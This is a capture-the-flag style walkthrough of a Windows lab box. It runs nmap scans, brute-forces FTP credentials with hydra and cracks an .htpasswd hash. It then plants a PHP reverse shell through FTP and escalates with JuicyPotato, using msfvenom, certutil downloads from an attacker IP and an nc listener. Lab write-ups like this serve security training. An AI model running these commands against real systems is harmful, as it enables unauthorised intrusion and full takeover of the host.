Level: Intermediate

```
sudo nmap 192.168.244.46 -p- -vv -n -Pn -T4
```

results
```
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 125
242/tcp  open  direct        syn-ack ttl 125
3145/tcp open  csi-lfap      syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125
```

```
nmap 192.168.244.46 -p21,242,3145,3389 -vv -n -Pn -sC -sV
```

results: 
```
PORT     STATE SERVICE            REASON          VERSION
21/tcp   open  ftp                syn-ack ttl 125 zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Dec 15 14:17 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Oct 11 01:16 accounts
242/tcp  open  http               syn-ack ttl 125 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3145/tcp open  zftp-admin         syn-ack ttl 125 zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125
| ssl-cert: Subject: commonName=LIVDA
| Issuer: commonName=LIVDA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-09T17:16:18
| Not valid after:  2026-04-10T17:16:18
| MD5:   6bfe:7637:252b:c376:89c8:e8a3:b163:9ec1
| SHA-1: 1316:97ca:628d:4e98:83c4:af51:2537:b4f5:2e20:55fe
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQjGzgfFRktJdB1OA45IO/BTANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVMSVZEQTAeFw0yNTEwMDkxNzE2MThaFw0yNjA0MTAxNzE2MTha
| MBAxDjAMBgNVBAMTBUxJVkRBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAi39FWlmRLE9vKDpT27n3nM22SO7NGy8LZoUZ8ntqXlXwbtrLRIm8YbyTuKwm
| JPaYa4xelXs2FkxLVqUA7SAk6loCpIrv0BBV7Du9rTm92xkhjMY1xiqe4hg2aO87
| kxrzSx+vwjweN/D57hnqVmnCnEQjLjRe5GLh8p+R4XQaOnO5kW9JLvcr9s3tNEpb
| /YIKQu9GO/NmcUMurkP4kGzIHUC1WBwhyDn93o5b9DI7EH4knR+9nsu5Lkj85JR6
| 9PWP7Q+SdDRHiCKVp11Vv7IAGaCRuUzOSSRqd958mdeRNSlupsSCA7rqnGxlzTVE
| AuT6qpVGDtSvhiTy4iAVT9ZPjQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBACjanYqgLHXTGlGhs8/m
| +UCJ9PLc2L32YwtXmrOSz69l1Ok75EX3dibszU8mes0+OF0xVpI6vp7jNk0NwkXr
| qNTad0HI7/EikNEk6k7qYZhpE2gl0mIzS5G4OMm/ICOuAp/YMamahikTAwQ6vR3s
| pMdzQWxQcKw/nCo9C1aV2XORFbuqzixEF/MbxHdBla2ujy2ZuYz2RTjBmi9VtILK
| xhbvpsBGfy7+wqkrENszkAmL+BqLGAUp9I04O5+n2WPu+NiOJveS4DA6bDVWKvxy
| PALyBkhZa1zrFrSW2BpTD8fimyedrN+JWmrB6svEvlwwzHIRez2d0YQoCEKApD8D
| sfY=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-12-15T06:17:54+00:00
|_ssl-date: 2025-12-15T06:17:58+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# FTP 
ftp can login as anonymous 
```
ftp 192.168.244.46 21
```
name: anonymous
password: 

but nothing can be downloaded

presence of two account in ftp: admin and anonymous
```
total 4
dr-xr-xr-x   1 root     root          512 Oct 11 01:16 backup
----------   1 root     root          764 Oct 11 01:16 acc[Offsec].uac
----------   1 root     root         1034 Dec 15 14:28 acc[anonymous].uac
----------   1 root     root          926 Oct 11 01:16 acc[admin].uac
```

try to bruteforce the password of admin
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.158.244.46 -t 64
```
found credentials of admin:admin

managed to login: 
```
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
```

```
get index.php
get .htpasswd
get .htaccess
```


.htpasswd
```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

find what hashcat mod this is in hashcat: https://hashcat.net/wiki/doku.php?id=example_hashes

![](../../Assets/Screenshot%202025-12-15%20at%203.01.30%20PM.png)
mode: 1600

cracked: 
![](../../Assets/Screenshot%202025-12-15%20at%203.04.44%20PM.png)
password is elite

login credentials for php site -> offsec:elite

![](../../Assets/Screenshot%202025-12-15%20at%203.25.04%20PM.png)
goes to index.php -> same index.php in the ftp server


can try to upload stuff from ftp to see whether it will show in http also or not


duplicate index.php to test.php and `put test.php` in the ftp server
![](../../Assets/Screenshot%202025-12-15%20at%203.26.33%20PM.png)
![](../../Assets/Screenshot%202025-12-15%20at%203.25.55%20PM.png)

php reverse shell script -> https://www.revshells.com

upload PHP Ivan Sincek
![](../../Assets/Screenshot%202025-12-15%20at%203.57.42%20PM.png)


Get shell 
![](../../Assets/Screenshot%202025-12-15%20at%203.58.07%20PM.png)

SeImpersonatePrivilege is available
![](../../Assets/Screenshot%202025-12-15%20at%204.00.05%20PM.png)

its Windows Server 2008 so can use cJuicyPotato

Download JuicyPotato https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe to our attack box first

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=8888 -f exe > shell.exe
```
host a python http server on port 8000
```
python3 -m http.server 8000
```

have certutil download it from the windows machine

```
certutil -urlcache -f http://192.168.45.225:8000/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -f http://192.168.45.225:8000/shell.exe shell.exe
```

run JuicyPotato.exe

```
jp32.exe -l 1234 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\bin\apache\Apache2.2.21\shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
-l -> port can be arbitrary as long as there is no service running on it 


catch that back with 
```
nc -lnvp 8888
```

![](../../Assets/Screenshot%202025-12-15%20at%204.26.33%20PM.png)

flags are at C:\Users\Administrator\Desktop\proof.txt and C:\Users\apache\Desktop\user.txt